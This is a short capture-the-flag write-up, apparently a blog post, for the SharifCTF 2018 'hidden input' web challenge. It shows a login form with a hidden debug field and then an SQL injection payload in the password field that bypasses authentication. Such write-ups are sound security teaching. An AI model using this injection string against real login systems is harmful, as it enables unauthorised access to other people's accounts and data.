---
layout:     post
title:      "SharifCTF 2018 - hidden input"
date:       2018-02-04 0:00:00
author:     "W3ndige"
permalink: /:title/
category: 'Write-Ups'
---
Another challenge [SharifCTF](http://ctf.certcc.ir/ctf8/) called ***hidden input***.

- Category: Forensics
- Points: 50

{% highlight text %}
Login if you can :)
{% endhighlight %}

### Solution

At first we are presented with a simple webpage containing 2 inputs - login and password.

{% highlight html %}
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<link href='fonts.css' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" type="text/css" href="asset/style.css">
</head>
<body>
	<div class="logo"><div class="lspan">SharifCTF</div></div>
	<form method="POST" action="login.php">
		<div class="login-block">
			<h1>Login</h1>
			<input type="text" value="" placeholder="Username" id="Username" name="Username"/>
			<input type="password" value="" placeholder="Password" id="Password" name="Password"/>
			<input type="hidden" name="debug" id="debug" value="0">
			<button>Login</button>
		</div>
	</form>
</body>
</html>
{% endhighlight %}

But upon inspecting the source code, we can see a hidden input - called debug. After changing its value to `1` and logging in, in addition to the login failed message we can see whole SQL query.

{% highlight sql %}
username: admin
password: asd
SQL query: SELECT * FROM users WHERE username=('admin') AND password=('asd')
{% endhighlight %}

Let's construct a simple SQL injection in order to get into the webpage. Firstly, we have to add some value into the password variable, then add `'` character to close the previous quotation mark an finally SQL statement that will trick the query `OR 1=1;`. Last step is to comment out left characters from the original query.

{% highlight sql %}
username: admin
password: 5') OR 1=1; #
SQL query: SELECT * FROM users WHERE username=('admin') AND password=('5') OR 1=1; #')
{% endhighlight %}

### Tools
No external tools used

### References
[https://www.owasp.org/index.php/SQL_Injection](https://www.owasp.org/index.php/SQL_Injection)
